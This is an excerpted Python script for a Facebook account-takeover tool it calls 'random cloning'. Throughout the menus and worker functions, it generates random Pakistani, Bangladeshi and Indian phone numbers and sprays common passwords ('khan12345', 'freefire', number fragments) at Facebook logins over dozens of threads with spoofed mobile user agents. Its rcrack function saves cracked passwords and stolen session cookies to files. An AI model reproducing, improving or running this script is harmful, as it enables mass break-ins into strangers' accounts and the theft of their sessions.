...
#____[IMPORT MODULES]______
try:
    import requests
except ImportError:
    print('\033[1;32m[+] INSTALLING REQUESTS')
    os.system('pip install requests')
    print('\033[1;32m[+] SUCCESSFULLY INSTALLED REQUESTS')
try:
    from bs4 import BeautifulSoup
except ImportError:
    print('\033[1;32m[+] INSTALLING BEAUTIFUL_SOUP')
    os.system('pip install bs4')
    print('\033[1;32m[+] SUCCESSFULLY INSTALLED BEAUTIFUL_SOUP')
try:
    import concurrent.futures
except ImportError:
    print('\033[1;32m[+] INSTALLING FUTURES')
    os.system('pip install futures')
    print('\033[1;32m[+] SEUCCESFULLY INSTALLED CONCURRENT_FUTURES')

try:
    clear()
    print('\n\t\033[1;32m[+] LOADING PLEASE WAIT >>>')
except:
    pass
...
ua_string = f"Dalvik/2.1.0 (Linux; U; Android {android_version}; {model_device} Build/{build_device}) [FBAN/Messenger;FBAV/{versi_chrome};FBPN/com.facebook.orca;FBLC/{language};FBBV/{versi_app};FBCR/{simcard};FBMF/{merk_device};FBBD/{brand_device};FBDV/{model_device};FBSV/{android_version};FBCA/{cpu_device};FBDM/{large_device};]"
...
def dt():
    print('\033[1;31m[+] DATE + TIME    :\033[1;32m',dt_string)
...
\033[1;31m##    ##  ##    ##    ##        ##      ##    ##
 \033[1;31m######    ######   ######      ##      ##    ##
\033[1;33m--------------------------------------------------
\033[1;31m[+] OWNER          :  \033[1;32mZH-JOIYA
\033[1;31m[+] GITHUB         :  \033[1;32mZH-JOIYA404
\033[1;31m[+] FACEBOOK       :  \033[1;32mJ　O　I　Y　 A　ツ
\033[1;31m[+] TOOL TYPE      :  \033[1;32mRANDOM CLONING
\033[1;31m[+] VERSION        :  \033[1;32m0.1
\033[1;33m--------------------------------------------------"""

def main():
    clear()
    print(logo)
    print('\033[1;32m[1] START RANDOM CLONING')
    print('\033[1;33m[2] CONTACT WITH OWNER')
    print('\033[1;33m[3] EXIT MAIN MENU')
    linex()
    joiya=input('\033[1;31m[+] SELECT OPTION :\033[1;32m ')
    if joiya in ('1','01'):
        start()
    if joiya in ('2','02'):
        os.system('xdg-open https://www.facebook.com/profile.php?id=100084212408089')
        main()
    if joiya in ('3','03'):
        jalan('\033[1;31m[+] BYE BYE')
        exit()
    else:
        jalan('\033[1;31m[+] SELECTED OPTION IS INCORRECT')
        main()

def start():
    clear()
    print(logo)
    print('\033[1;32m[1] RANDOM CLONING INDIA')
    print('\033[1;32m[2] RANDOM CLONING PAKISTAN')
    print('\033[1;32m[3] RANDOM CLONING BANGLADESH')
    print('\033[1;32m[4] RANDOM CLONING CHOICE PASS')
    linex()
    joiya=input('\033[1;31m[+] SELECT OPTION : \033[1;32m')
    if joiya in ('1','01'):
        ind()
...
def pk():
    clear()
    print(logo)
    print('\033[1;32m[1] RANDOM CLONING PASS 1')
    print('[2] RANDOM CLONING PASS 2')
    print('[3] RANDOM CLONING PASS 3')
    print('[4] RANDOM CLONING PASS 4')
    print('[5] RANDOM CLONING PASS 5')
    linex()
    pk=input('\033[1;31m[+] SELECT OPTION : \033[1;32m')
    if pk in ('1','01'):
        pk1()
    if pk in ('2','01'):
        pk2()
...
def pk1():
    ...
    clear()
    print(logo)
    print('\033[1;31m[+] EXAMPLE : \033[1;32m300, 304, 317, 337, 347')
    linex()
    code = input('\033[1;31m[+] PUT CODE : \033[1;32m')
    clear()
    print(logo)
    print('\033[1;31m[+] EXAMPLE : \033[1;32m1000, 2000, 5000, 10000')
    linex()
    limit = int(input('\033[1;31m[+] PUT LIMIT : \033[1;32m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        uid.append(nmp)
    with speed(max_workers=35) as channa:
        clear()
        print(logo)
        tl = str(len(uid))
        dt()
        print('\033[1;31m[+] TOTAL ACCOUNTS :\033[1;32m '+tl)
        print('\033[1;31m[+] SELECTED CODE  : \033[1;32m+92'+code)
        print('\033[1;31m[+] PROCESS HAS BEEN STARTED')
        print('\033[1;32m[+] USE FLIGHT MODE FOR SPEED UP')
        linex()
        for love in uid:
            uid = '92'+code+love
            pwx = [love]
            channa.submit(rcrack,uid,pwx,tl)
    linex()
    print('\033[1;32m[+] TOTAL OK      : ',len(ok))
    print('\033[1;31m[+] TOTAL CP      : ',len(cp))
    linex()
    input('\033[1;31m[+] PRESS ENTER TO EXIT')
    exit()
...
def pk3():
    ...
    with speed(max_workers=35) as channa:
        ...
        for love in uid:
            uid = '92'+code+love
            pwx = [love,'khan1122','khan12345','khan786']
            channa.submit(rcrack,uid,pwx,tl)
    linex()
    print('\033[1;32m[+] TOTAL OK      : ',len(ok))
    print('\033[1;31m[+] TOTAL CP      : ',len(cp))
...
def pk4():
    ...
    with speed(max_workers=35) as channa:
        ...
        for love in uid:
            uid = '92'+code+love
            pwx = [love,'khan123','khan1234','khan12345','khan khan']
            channa.submit(rcrack,uid,pwx,tl)
    linex()
    print('\033[1;32m[+] TOTAL OK      : ',len(ok))
    print('\033[1;31m[+] TOTAL CP      : ',len(cp))
...
def pk5():
    ...
    with speed(max_workers=35) as channa:
        ...
        for love in uid:
            uid = '92'+code+love
            pwx = [love,'khan1122','khan12345','khan1234','khan123','khan12']
            channa.submit(rcrack,uid,pwx,tl)
    linex()
    print('\033[1;32m[+] TOTAL OK      : ',len(ok))
    print('\033[1;31m[+] TOTAL CP      : ',len(cp))
...
def bd():
    ...
    print('[5] RANDOM CLONING PASS 5')
    linex()
    bd=input('\033[1;31m[+] SELECT OPTION : \033[1;32m')
    if bd in ('1','01'):
        bd1()
    if bd in ('2','02'):
        bd2()
...
def ind():
    ...
    print('[5] RANDOM CLONING PASS 5')
    linex()
    ind=input('\033[1;31m[+] SELECT OPTION : \033[1;32m')
    if ind in ('1','01'):
        ind1()
    if ind in ('2','02'):
        ind2()
...
def bd1():
	...
	clear()
	print(logo)
	print('\033[1;31m[+] EXAMPLE : \033[1;32m130, 131, 132, 141')
	linex()
	code = input('\033[1;31m[+] PUT CODE : \033[1;32m')
	clear()
	print(logo)
	...
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=65) as channa:
		clear()
		print(logo)
		tl = str(len(uid))
		dt()
...
def bd4():
	...
	with ThreadPool(max_workers=65) as channa:
		...
		for love in uid:
			uid = '+880'+code+love
			pwx = [love,code+love,'free fire','i love you','freefire']
			channa.submit(rcrack,uid,pwx,tl)
	linex()
	print('\033[1;32m[+] TOTAL OK      : ',len(ok))
	print('\033[1;31m[+] TOTAL CP      : ',len(cp))
...
def bd5():
	...
	with ThreadPool(max_workers=65) as channa:
		...
		for love in uid:
			uid = '+880'+code+love
			pwx = [love,code+love,'freefire','free fire','ff boy','ff girl','i love freefire']
			channa.submit(rcrack,uid,pwx,tl)
	linex()
	print('\033[1;32m[+] TOTAL OK      : ',len(ok))
	print('\033[1;31m[+] TOTAL CP      : ',len(cp))
...
def ind1():
	...
	clear()
	print(logo)
	print('\033[1;31m[+] EXAMPLE : \033[1;32m977, 978, 990, 663')
	linex()
	code = input('\033[1;31m[+] PUT CODE : \033[1;32m')
	clear()
	print(logo)
...
def ind4():
	...
	with ThreadPool(max_workers=65) as channa:
		...
		for love in uid:
			...
			aj = uid[0:6]
			aja = uid[0:8]
			pwx = [love,code+love,aj,aja,'free fire','freefire','i love freefire']
			channa.submit(rcrack,uid,pwx,tl)
	linex()
	print('\033[1;32m[+] TOTAL OK      : ',len(ok))
	print('\033[1;31m[+] TOTAL CP      : ',len(cp))
...
def ind5():
	...
	with ThreadPool(max_workers=65) as channa:
		...
		for love in uid:
			...
			aj = uid[0:6]
			aja = uid[0:8]
			pwx = [love,code+love,aj,aja,'freefire','free fire','ff boy','ff girl','i love freefire']
			channa.submit(rcrack,uid,pwx,tl)
	linex()
	print('\033[1;32m[+] TOTAL OK      : ',len(ok))
	print('\033[1;31m[+] TOTAL CP      : ',len(cp))
...
def choice():
    ...
    os.system("clear")
    print(logo)
    print('\033[1;31m[+] EXAMPLE : \033[1;32m1/ 2/ 3/ 4/ 5/ 6/ 7/ 8/ 9')
    linex()
    passx = int(input("\033[1;31m[+] ENTER PASSWORD LIMIT : \033[1;32m"))
    clear()
    print(logo)
    print('\033[1;31m[+] EXAMPLE : \033[1;32mkhan123, khan12345, khan1122')
    linex()
    for joiya in range(passx):
        pww = input(f"\033[1;31m[{joiya+1}] ENTER PASSWORD : \033[1;32m")
        uid.append(pww)
...
def rcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			...
			'user-agent': 'Mozilla/5.0 (Mobile; TCL 4056W; rv:84.0) Gecko/84.0 Firefox/84.0 KAIOS/3.0',
			}
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;32m[ZH-JOIYA-OK] '+cid+' [√] '+ps+'\n\033[1;37m[COOKIES] :\033[1;32m '+coki+'')
				open('/sdcard/JOIYA/ZH-JOIYA-OK.txt', 'a').write('[ZH-JOIYA-OK] '+cid+' [√] '+ps+'\n[COOKIES] : '+coki+'\n')
				ok.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\033[1;31m[ZH-JOIYA-CP] '+cid+' [×] '+ps+'')
				open('/sdcard/JOIYA/ZH-JOIYA-CP.txt', 'a').write('[ZH-JOIYA-CP] '+cid+' [×] '+ps+'\n')
				cp.append(cid)
				break
			else:
				continue
		loop+=1
		sys.stdout.write('\r\033[1;37m[ZH-JOIYA-XD] [%s/%s]  [OK:%s]  [CP:%s] \r'%(loop,tl,len(ok),len(cp))),
		sys.stdout.flush()
	except:
		pass
